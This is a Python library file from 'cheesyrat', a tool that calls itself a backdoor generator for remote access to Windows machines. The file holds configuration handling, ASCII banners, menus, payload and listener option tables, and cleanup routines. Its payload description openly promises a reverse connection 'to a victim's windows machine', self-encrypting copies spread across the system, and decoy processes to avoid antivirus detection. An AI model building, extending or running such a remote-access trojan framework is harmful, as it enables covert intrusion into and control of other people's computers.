import os
import time
import sys
import json
import platform
import subprocess
from lib import colors

# Try to find and import the settings.py config file
try:
    sys.path.append("/etc/cheesyrat/")
    import settings
except ImportError:
    print(colors.RED + "\n[!] An error has occured: Can't import /etc/cheesyrat/settings.py. Run: %s\n" % ( os.path.abspath( "./config/config-update.py")))
    sys.exit()

def check_root():
    if not os.geteuid() == 0:
        sys.exit("\nOnly root can run this script\n")

global config_json
global run_json
run_json = settings.HANDLER_PATH + "run.json"
config_json = settings.HANDLER_PATH + "config.json"

def create_json_files(force=False):
    if force == True:
        if os.path.isfile(run_json):
            os.remove(run_json)
        if os.path.isfile(config_json):
            os.remove(config_json)
    else:
        pass
    if not os.path.isfile(run_json):
        with open(run_json, 'w') as run_file:
            run_data = {'is_sessions_open': "false",
                        'sessions_open': "0"}
            json.dump(run_data, run_file)
    if not os.path.isfile(config_json):
        with open(config_json, 'w') as config_file:
            config_data = {'lhost_payload': "",
                           "lport_payload": 4444,
                           "lhost_listener": "",
                           "lport_listener": 4444,
                           "listen_proxy": "",
                           'number_decoy_processes': "2",
                           "temp_port": "443",
                           "cmd_timeout": "10",
                           "compile_admin": "false"}
            json.dump(config_data, config_file)

def get_run_json_file():
    try:
        if os.path.isfile(run_json):
            return run_json
        elif not os.path.isfile(run_json):
            create_json_files()
            return run_json
        else:
            error_message("Could not get the json run file! Please force quit and restart the framework.", False)
    except:
        error_message("There was an error loading framework in line 22 of main lib file. Please report to author on github.")

def get_config_json_file():
    try:
        if os.path.isfile(config_json):
            return config_json
        elif not os.path.isfile(config_json):
            create_json_files()
            return config_json
        else:
            error_message("Could not get the json config file! Please force quit and restart the framework.", False)
    except:
        error_message("There was an error loading framework in line 22 of main lib file. Please report to author on github.")

def delete_config_and_run():
    # do what the function says here
    pass

def warning_message(warning):
    print(colors.YELLOW + "\n[!] Warning: " + warning + colors.END + "\n")

def error_message(error, exit):
    if exit == True:
        print(colors.RED + "\n[!] An error has occured: " + str(error) + "Exiting..." + colors.END + "\n")
        sys.exit()
    elif exit == False:
        print(colors.RED + "\n[!] An error has occured: " + str(error) + colors.END + "\n")

def success_message(success, indent):
    if indent == True:
        print(colors.GREEN + "\n[*] Success: " + success + "\n")
    elif indent == False:
        print(colors.GREEN + "[*] Success: " + success)

def plain_message(color, message, indent_top=False, indent_bottom=False):
    if indent_top == True and indent_bottom == False:
        print("\n" + color + message + colors.END)
    elif indent_bottom == True and indent_top == False:
        print(color + message + colors.END + "\n")
    elif indent_top == True and indent_bottom == True:
        print("\n" + color + message + colors.END + "\n")
    elif indent_top == False and indent_bottom == False:
        print(color + message + colors.END)

def clear():
    subprocess.Popen( "cls" if platform.system() == "Windows" else "clear", shell=True)
    time.sleep(0.1)

def print_version():
    print('')
    print('    ,--,  .-. .-.,---.  ,---.  ,---.     .---..-.   .-.,---.    .--.  _______ ')
    print("  .' .')  | | | || .-'  | .-'  | .-'    ( .-._)\ \_/ )/| .-.\  / /\ \|__   __|")
    print("  |  |(_) | `-' || `-.  | `-.  | `-.   (_) \    \   (_)| `-'/ / /__\ \ )| |")
    print("  \  \    | .-. || .-'  | .-'  | .-'   _  \ \    ) (   |   (  |  __  |(_) |")
    print("   \  `-. | | |)||  `--.|  `--.|  `--.( `-'  )   | |   | |\ \ | |  |)|  | |")
    print("    \____\/(  (_)/( __.'/( __.'/( __.' `----'   /(_|   |_| \)\|_|  (_)  `-'")
    print('       (__)   (__)   (__)   (__)             (__)        (__)')    
    print("")
    print(colors.END + colors.BOLD + '            [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']   Backdoor Generator for Remote Access  [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.END + colors.BOLD + '            [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']' + colors.VIOLET + colors.BOLD + '          Created by:' + colors.RED + ' kyryloren          ' + colors.END + colors.BOLD + '[' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.END + colors.BOLD + '            [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']' + colors.VIOLET + colors.BOLD + '             Version:' + colors.RED + ' 1.0.0' + colors.END + colors.BOLD + '              [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.END + colors.BOLD + '            [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']' + colors.VIOLET + colors.BOLD + '      Github:' + colors.RED + colors.BOLD + ' https://git.io/Jeoco' + colors.END + colors.BOLD + '       [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.END + colors.BOLD + '            [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']' + colors.VIOLET + ' https://www.buymeacoffee.com/kyryloren/' + colors.END + colors.BOLD + ' [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.END + colors.BOLD + '            [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']                                         [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.END + colors.BOLD + '            [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']        Rats can eat cheese too!         [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.END + colors.BOLD + '            [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + '] ._____________________________________. [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.END + colors.BOLD + '            \_.-------------------------------------------._/' + colors.END)
    print('')

def banner():
    print('')
    print(colors.GREEN + colors.BOLD + '             /|         ,  ')
    print('           ,///        /|  ')
    print('          // //     ,///   ')
    print('         // //     // //   ')
    print('        || ||    // //   ' + '  ,--,  .-. .-.,---.  ,---.  ,---.     .---..-.   .-.,---.    .--.  _______ ')
    print('        // //     || ||  ' + ".' .')  | | | || .-'  | .-'  | .-'    ( .-._)\ \_/ )/| .-.\  / /\ \|__   __|")
    print('        || ||   // // ' + "   |  |(_) | `-' || `-.  | `-.  | `-.   (_) \    \   (_)| `-'/ / /__\ \ )| |")
    print('        || ||  // //  ' + "   \  \    | .-. || .-'  | .-'  | .-'   _  \ \    ) (   |   (  |  __  |(_) |")
    print('        || || || ||   ' + "    \  `-. | | |)||  `--.|  `--.|  `--.( `-'  )   | |   | |\ \ | |  |)|  | |")
    print('         \\,\|,|\_//   ' + "     \____\/(  (_)/( __.'/( __.'/( __.' `----'   /(_|   |_| \)\|_|  (_)  `-'")
    print('          \\)\)\\|/     ' + '       (__)   (__)   (__)   (__)             (__)        (__)')
    print('         )-."" .-(         ')
    print('         //^\` `/^\\        ' + colors.END + colors.BOLD + '[' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']   Backdoor Generator for Remote Access  [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.GREEN + colors.BOLD + '        //  |   |  \\       ' + colors.END + colors.BOLD + '[' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']' + colors.VIOLET + colors.BOLD + '          Created by:' + colors.RED + ' kyryloren          ' + colors.END + colors.BOLD + '[' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.GREEN + colors.BOLD + '      ,/_| ' + colors.END + colors.BOLD + '0' + colors.GREEN + colors.BOLD + '| _ | ' + colors.END + colors.BOLD + '0' + colors.GREEN + colors.BOLD + '|_\,    ' + colors.END + colors.BOLD + '[' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']' + colors.VIOLET + colors.BOLD + '             Version:' + colors.RED + ' 1.0.0' + colors.END + colors.BOLD + '              [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.GREEN + colors.BOLD + '    /`    `"=.v.="`    `\\  ' + colors.END + colors.BOLD + '[' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']' + colors.VIOLET + colors.BOLD + '      Github:' + colors.RED + colors.BOLD + ' https://git.io/Jeoco' + colors.END + colors.BOLD + '       [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.GREEN + colors.BOLD + '   /`    _."{_,_}"._    `\\ ' + colors.END + colors.BOLD + '[' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']' + colors.VIOLET + ' https://www.buymeacoffee.com/kyryloren/' + colors.END + colors.BOLD + ' [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.GREEN + colors.BOLD + '  `/`  ` \  |||  / `  `\`  ' + colors.END + colors.BOLD + '[' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']                                         [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.GREEN + colors.BOLD + '   `",_  \\=^~^=//  _,"`    ' + colors.END + colors.BOLD + '[' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']        Rats can eat cheese too!         [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.GREEN + colors.BOLD + '       "=,\"-=-"/,=         ' + colors.END + colors.BOLD + '[' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + '] ._____________________________________. [' + colors.GREEN + colors.BOLD + '--' + colors.END + colors.BOLD + ']')
    print(colors.GREEN + colors.BOLD + "           '---'           " + colors.END + colors.BOLD + '\_.-------------------------------------------._/' + colors.END)
    print('                             ')
    print('                             ')

def checking_banner():
    print("")
    print(colors.VIOLET + " +------------------------------------------------------------------------------------------------------------------+")
    print(colors.VIOLET + " |" + colors.CYAN + "  .--,       .--,     " + colors.YELLOW + "    _________  .__                      __    .__" + colors.VIOLET + "                                           |")
    print(colors.VIOLET + " |" + colors.CYAN + " ( (  \.---./  ) )    " + colors.YELLOW + "    \_   ___ \ |  |__    ____    ____  |  | __|__|  ____     ____" + colors.VIOLET + "                           |")
    print(colors.VIOLET + " |" + colors.CYAN + "  '.__/" + colors.END + "o   o" + colors.CYAN + "\__.'     " + colors.YELLOW + "    /    \  \/ |  |  \ _/ __ \ _/ ___\ |  |/ /|  | /    \   / ___\\" + colors.VIOLET + "                          |")
    print(colors.VIOLET + " |" + colors.CYAN + "     {=  ^  =}        " + colors.YELLOW + "    \     \____|   Y  \\\\  ___/ \  \___ |    < |  ||   |  \ / /_/  >" + colors.VIOLET + "                         |")
    print(colors.VIOLET + " |" + colors.CYAN + "      >  -  <         " + colors.YELLOW + "     \______  /|___|  / \___  > \___  >|__|_ \|__||___|  / \___  /" + colors.VIOLET + "                          |")
    print(colors.VIOLET + " |" + colors.CYAN + "     /       \        " + colors.YELLOW + "    ________\/_     \/      \/.__   \/      \/         \/ /_____/                    __" + colors.VIOLET + "     |")
    print(colors.VIOLET + " |" + colors.CYAN + "    //       \\\\       " + colors.YELLOW + "    \_   _____/  ____  ___  __|__|_______   ____    ____    _____    ____    ____  _/  |_" + colors.VIOLET + "   |")
    print(colors.VIOLET + " |" + colors.CYAN + "   //|   .   |\\\\      " + colors.YELLOW + "     |    __)_  /    \ \  \/ /|  |\_  __ \ /  _ \  /    \  /     \ _/ __ \  /    \ \   __\\" + colors.VIOLET + "  |")
    print(colors.VIOLET + " |" + colors.CYAN + "   " + '"' + "'\       /'" + '"_.-~^`' + "'-." + colors.YELLOW + "  |        \|   |  \ \   / |  | |  | \/(  <_> )|   |  \|  Y Y  \\\\  ___/ |   |  \ |  |  " + colors.VIOLET + "  |")
    print(colors.VIOLET + " |" + colors.CYAN + "      \  _  /--'     `" + colors.YELLOW + "    /_______  /|___|  /  \_/  |__| |__|    \____/ |___|  /|__|_|  / \___  >|___|  / |__|" + colors.VIOLET + "    |")
    print(colors.VIOLET + " |" + colors.CYAN + "    ___)( )(___       " + colors.YELLOW + "            \/      \/                                 \/       \/      \/      \/" + colors.VIOLET + "          |")
    print(colors.VIOLET + " |" + colors.CYAN + "   (((__) (__)))                                  " + colors.YELLOW + "Created by " + colors.CYAN + "kyryloren" + colors.VIOLET + "                                            |")
    print(colors.VIOLET + " +------------------------------------------------------------------------------------------------------------------+")
    print("")

def main_menu_help():
    print("")
    print(colors.CYAN + "+--------------------------------------------------+")
    print(colors.CYAN + "|" + colors.GREEN + "  Main Menu Help Commands:" + colors.CYAN + "                        |")
    print(colors.CYAN + "+--------------------------------------------------+")
    print(colors.CYAN + "|  " + colors.END + "help or ?: " + colors.GREEN + "This help message" + colors.CYAN + "                    |")
    print(colors.CYAN + "|  " + colors.END + "generate: " + colors.GREEN + "Switch to the cheesyrat generator" + colors.CYAN + "     |")
    print(colors.CYAN + "|  " + colors.END + "listen: " + colors.GREEN + "Switch to the cheesyrat listener" + colors.CYAN + "        |")
    print(colors.CYAN + "|  " + colors.END + "clear: " + colors.GREEN + "Clear the screen" + colors.CYAN + "                         |")
    print(colors.CYAN + "|  " + colors.END + "banner: " + colors.GREEN + "Print the banner" + colors.CYAN + "                        |")
    print(colors.CYAN + "|  " + colors.END + "credits: " + colors.GREEN + "View the credits" + colors.CYAN + "                       |")
    print(colors.CYAN + "|  " + colors.END + "quit or exit: " + colors.GREEN + "Exit the cheesyrat framework" + colors.CYAN + "      |")
    print(colors.CYAN + "|  " + colors.END + "force quit: " + colors.GREEN + "[!] Force quit the framework" + colors.CYAN + "        |")
    print(colors.CYAN + "+--------------------------------------------------+")
    print("")

def generate_menu_help():
    print("")
    print(colors.CYAN + "+--------------------------------------------------+")
    print(colors.CYAN + "|" + colors.GREEN + "  Generate Menu Help Commands:" + colors.CYAN + "                    |")
    print(colors.CYAN + "+--------------------------------------------------+")
    print(colors.CYAN + "|  " + colors.END + "help or ?: " + colors.GREEN + "This help message" + colors.CYAN + "                    |")
    print(colors.CYAN + "|  " + colors.END + "options: " + colors.GREEN + "List the options for the payload" + colors.CYAN + "       |")
    print(colors.CYAN + "|  " + colors.END + "info: " + colors.GREEN + "List info for payload and options" + colors.CYAN + "         |")
    print(colors.CYAN + "|  " + colors.END + "set LHOST [ip]: " + colors.GREEN + "Set an option for the payload" + colors.CYAN + "   |")
    print(colors.CYAN + "|  " + colors.END + "run/generate/build: " + colors.GREEN + "Generate payload" + colors.CYAN + "            |")
    print(colors.CYAN + "|  " + colors.END + "clear: " + colors.GREEN + "Clear the screen" + colors.CYAN + "                         |")
    print(colors.CYAN + "|  " + colors.END + "back: " + colors.GREEN + "Return to main menu" + colors.CYAN + "                       |")
    print(colors.CYAN + "|  " + colors.END + "quit or exit: " + colors.GREEN + "Exit the cheesyrat framework" + colors.CYAN + "      |")
    print(colors.CYAN + "|  " + colors.END + "force quit: " + colors.GREEN + "[!] Force quit the framework" + colors.CYAN + "        |")
    print(colors.CYAN + "+--------------------------------------------------+")
    print("")

def listener_menu_help():
    print("")
    print(colors.CYAN + "+--------------------------------------------------+")
    print(colors.CYAN + "|" + colors.GREEN + "  Listener Menu Help Commands:" + colors.CYAN + "                    |")
    print(colors.CYAN + "+--------------------------------------------------+")
    print(colors.CYAN + "|  " + colors.END + "help or ?: " + colors.GREEN + "This help message" + colors.CYAN + "                    |")
    print(colors.CYAN + "|  " + colors.END + "options/info: " + colors.GREEN + "List the options for the listener" + colors.CYAN + " |")
    print(colors.CYAN + "|  " + colors.END + "set [OPTION]: " + colors.GREEN + "Set an option for the listener" + colors.CYAN + "    |")
    print(colors.CYAN + "|  " + colors.END + "run/listen: " + colors.GREEN + "Start the listener" + colors.CYAN + "                  |")
    print(colors.CYAN + "|  " + colors.END + "clear: " + colors.GREEN + "Clear the screen" + colors.CYAN + "                         |")
    print(colors.CYAN + "|  " + colors.END + "back: " + colors.GREEN + "Return to main menu" + colors.CYAN + "                       |")
    print(colors.CYAN + "|  " + colors.END + "quit or exit: " + colors.GREEN + "Exit the cheesyrat framework" + colors.CYAN + "      |")
    print(colors.CYAN + "|  " + colors.END + "force quit: " + colors.GREEN + "[!] Force quit the framework" + colors.CYAN + "        |")
    print(colors.CYAN + "+--------------------------------------------------+")
    print("")

def sessions_menu_help():
    print("")
    print(colors.CYAN + "+--------------------------------------------------+")
    print(colors.CYAN + "|" + colors.GREEN + "  Session Help Commands:" + colors.CYAN + "                          |")
    print(colors.CYAN + "+--------------------------------------------------+")
    print(colors.CYAN + "|  " + colors.END + "sessions -h: " + colors.GREEN + "This help message" + colors.CYAN + "                  |")
    print(colors.CYAN + "|  " + colors.END + "sessions -l: " + colors.GREEN + "List current open sessions" + colors.CYAN + "         |")
    print(colors.CYAN + "|  " + colors.END + "sessions -i [#]: " + colors.GREEN + "Interact with session in shell" + colors.CYAN + " |")
    print(colors.CYAN + "+--------------------------------------------------+")
    print("")

def proxy_menu_help():
    print("")
    print(colors.CYAN + "+---------------------------------------------------------------------------+")
    print(colors.CYAN + "|" + colors.GREEN + "  Proxy Help Commands:" + colors.CYAN + "                                                     |")
    print(colors.CYAN + "+---------------------------------------------------------------------------+")
    print(colors.CYAN + "|  " + colors.END + "set proxy -h: " + colors.GREEN + "This help message" + colors.CYAN + "                                           |")
    print(colors.CYAN + "|  " + colors.END + "set proxy [SOCKS5, SOCKS4, HTTP] [HOST] [PORT]: " + colors.GREEN + "List current open sessions" + colors.CYAN + "|")
    print(colors.CYAN + "|  " + colors.END + "sessions -i [#]: " + colors.GREEN + "Interact with session in shell" + colors.CYAN + "                           |")
    print(colors.CYAN + "+---------------------------------------------------------------------------+")
    print("")

def check():
    clear()
    checking_banner()
    create_json_files()
    print("\n Starting framework...")
    time.sleep(1)

def input_func(text):
    py_version=platform.python_version()
    
    if py_version[0] == "3":
        Ans = input(text)
    else:
        error_message("Looks like you're not running Python 3!", True)
    return Ans

def credits():
    print(colors.CYAN + "+----------------------------------------------------------+")
    print(colors.CYAN + "|" + colors.GREEN + "  Credits:" + colors.CYAN + "                                                |")
    print(colors.CYAN + "+----------------------------------------------------------+")
    print(colors.CYAN + "|  " + colors.END + "This framework was created by @kyryloren" + colors.CYAN + "                |")
    print(colors.CYAN + "|  " + colors.END + "Github: " + colors.GREEN + "https://github.com/kyryloren" + colors.CYAN + "                    |")
    print(colors.CYAN + "+----------------------------------------------------------+")
    print(colors.CYAN + "|" + colors.GREEN + "  Notable Mensions:" + colors.CYAN + "                                       |")
    print(colors.CYAN + "+----------------------------------------------------------+")      
    print(colors.CYAN + "|  " + colors.END + "Offensive Security: " + colors.GREEN + "https://www.offensive-security.com" + colors.CYAN + "  |")
    print(colors.CYAN + "|  " + colors.END + "Kali Linux: " + colors.GREEN + "https://www.kali.org" + colors.CYAN + "                        |")
    print(colors.CYAN + "|  " + colors.END + "Fat Rat: " + colors.GREEN + "https://github.com/StreetSec/FatRat" + colors.CYAN + "            |")
    print(colors.CYAN + "+----------------------------------------------------------+")
    print("")

def payload_options():
    print("")
    print(colors.END + " Payload options => " + colors.YELLOW + "(windows/basic_reverse_tcp)")
    print("")
    data =[['Name', 'Current Setting', 'Required', 'Description'], ['----', '---------------', '--------', '-----------'], 
    ['LHOST', append_json("lhost_payload", get_config_json_file()), 'yes', 'The connect back address for the backdoor'], 
    ['LPORT', append_json("lport_payload", get_config_json_file()), 'yes', 'The connect back port for the backdoor'],
    ['TEMPPORT', append_json("temp_port", get_config_json_file()), 'yes', 'The temporary port to send payload '],
    ['DECOYPROC', append_json("number_decoy_processes", get_config_json_file()), 'no', 'The number of decoy process (max: 4)'],
    ['CMDTIMEOUT', append_json("cmd_timeout", get_config_json_file()), 'yes', 'Amount of timeout for each command to send (max: 50)'],
    ['COMPILEADMIN', append_json("compile_admin", get_config_json_file()), 'no', 'Should the compiled file ask for admin privilege right away?']]
    col_width = [max(map(len, col)) for col in zip(*data)]
    for row in data:
        print(colors.END + " " + " ".join((val.ljust(width) for val, width in zip(row, col_width))))
    print("")

def payload_info():
    payload_options()
    print(" The cheseyrat windows/basic_reverse_tcp is a payload which gives the attacker a remote reverse connection\n to the a victim's windows machine. This payload is basic as it is coded in python and doesn't have any\n special memory injection abilities. To hide itself, the virus encrypts itself and copies it to differeny\n locations on the machine, all with different encryption patterns. It also launches various decoy\n processes to try to avoid AV detection.\n\n The machine must be running Windows XP SP2 or higher.")
    print("")

def listener_options():
    print("")
    print(colors.END + " Listener options => " + colors.YELLOW + "(cheesyrat/windows/listener/reverse_tcp)")
    print("")
    data =[['Name', 'Current Setting', 'Required', 'Description'], ['----', '---------------', '--------', '-----------'], 
    ['LHOST', append_json("lhost_listener", get_config_json_file()), 'yes', 'The connect back address'], 
    ['LPORT', append_json("lport_listener", get_config_json_file()), 'yes', 'The connect back port'],
    ['Proxy', append_json("", get_config_json_file()), 'no', 'Proxy address and port']]
    col_width = [max(map(len, col)) for col in zip(*data)]
    for row in data:
        print(colors.END + " " + " ".join((val.ljust(width) for val, width in zip(row, col_width))))
    print("")

def append_json(name_to_append, file):
    with open(file) as json_file:
        data = json.load(json_file)
        return str(data[name_to_append])

def update_json(name_to_append, value, file):
    try:
        jsonFile = open(file, "r")
        data = json.load(jsonFile)
        jsonFile.close()
        data[name_to_append] = value
        with open(file, 'w+') as jsonFile:
            jsonFile.write(json.dumps(data))
            jsonFile.close()
    except Exception as e:
        error_message(e, False)

def add_json(name_to_append, value, push_file):
    with open(push_file, 'w') as json_file:
        data = {name_to_append: value}
        json.dump(data, push_file)

def force_quit():
    while True:
        cmd = input('\n' + colors.YELLOW + "Are you sure you want to exit??? Your sessions WILL NOT be restored (y/n) > ")
        if cmd.lower() == 'y' or cmd.lower() == 'yes':
            plain_message(colors.YELLOW, "If you say so... But next time don't exit like this.", False, True)
            sys.exit(1)
        elif cmd.lower() == 'n' or cmd.lower() == 'no':
            plain_message(colors.GREEN, "Good choice kid...", False, True)
            break
        else:
            error_message("Invalid choice. Try again.", False)

def exit_function():
    plain_message(colors.GREEN, "Trying to exit...", True, False)
    try:
        if os.path.isfile(run_json):
            if append_json("is_sessions_open", get_run_json_file()) == "false":
                if settings.SAVE_HANDLERS_ON_EXIT.lower() == "true":
                    if os.path.isfile(config_json):
                        plain_message(colors.GREEN, "Payload and handler values saved.")
                        plain_message(colors.GREEN, "Cleaning up...", False, False)
                        if os.path.isfile(run_json):
                            os.remove(run_json)
                        plain_message(colors.GREEN, "Thank you for shopping with cheesyrat. Come again soon. :)", False, True)
                elif settings.SAVE_HANDLERS_ON_EXIT.lower() == "false":
                        plain_message(colors.GREEN, "Payload and handler values will not be saved.")
                        plain_message(colors.GREEN, "Cleaning up...", False, False)
                        if os.path.isfile(run_json):
                            os.remove(run_json)
                        if os.path.isfile(config_json):
                            os.remove(config_json)
                        plain_message(colors.GREEN, "Thank you for shopping with cheesyrat. Come again soon. :)", False, True)
                else:
                    warning_message("Soomething is wrong with your config file. Please execute './cheesyrat.py --config' to reset defaults")
                try:
                    sys.exit(0)
                except SystemExit:
                    os._exit(0)
            elif append_json("is_sessions_open", get_run_json_file()) == "true":
                error_message("Cannot exit, there are sessions open.", False)
        elif not os.path.isfile(run_json):
            error_message("That's wierd... We couldn't find the run time json file... If you don't have sessions open please use 'force quit' to exit", False)
            warning_message("If you get this error again next time you try to quit, please take a screenshot of your terminal and submit as a bug.")
    except Exception as e:
        error_message(e, False)

def setup_framework():
    if settings.OPERATING_SYSTEM == "Kali":
        if os.path.exists("/usr/share/cheesyrat/config/setup.sh"):
            os.system('/usr/share/cheesyrat/config/setup.sh -f -s')
        else:
            print("\n[!] An error has occured: Kali is missing %s\n" % ("/usr/share/cheesyrat/config/setup.sh"))
            os.system('./config/setup.sh -f -s')
    else:
        os.system('./config/setup.sh -f -s')
        input('\n\nCheesyrat has ran setup.sh, press enter to continue')

def config_framework():
    if settings.OPERATING_SYSTEM == "Kali":
        if os.path.exists("/usr/share/cheesyrat/config/config-update.py"):
            os.system('cd /usr/share/cheesyrat/config/; ./config-update.py')
        else:
            print("\n[!] An error has occured: Kali is missing %s\n" % ("/usr/share/cheesyrat/config/config-update.py"))
            os.system('cd ./config/; ./config-update.py')
    else:
        os.system('cd ./config/; ./config-update.py')
    create_json_files(force=True)
    input('\n\nCheesyrat has reconfigured, press enter to continue')

def clean_payloads():
    print("\n[*] Cleaning %s" % (settings.PAYLOAD_SOURCE_PATH))
    os.system('rm -f %s/*.py' % (settings.PAYLOAD_SOURCE_PATH))

    print("[*] Cleaning %s" % (settings.PAYLOAD_COMPILED_PATH))
    os.system('rm -f %s/*.exe' % (settings.PAYLOAD_COMPILED_PATH))
    os.system('rm -f %s/*.bat' % (settings.PAYLOAD_COMPILED_PATH))

    print("[*] Cleaning %s" % (settings.HANDLER_PATH))
    os.system('rm -f %s/*.json' % (settings.HANDLER_PATH))

    print("[*] Cleaning ./tools/vt-notify/results.log")
    os.system('rm -f ./tools/vt-notify/results.log')

    success_message("Finished cleaning payloads!", True)
    time.sleep(2)

def get_max_connections():
    try:
        max_connections = int(settings.MAX_REVERSE_CONNECTIONS)
        return max_connections
    except ValueError:
        error_message("The value for MAX_REVERSE_CONNECTIONS in the config is not set to a number. Please type './cheesyrat --config' to reset to defaults.", False)
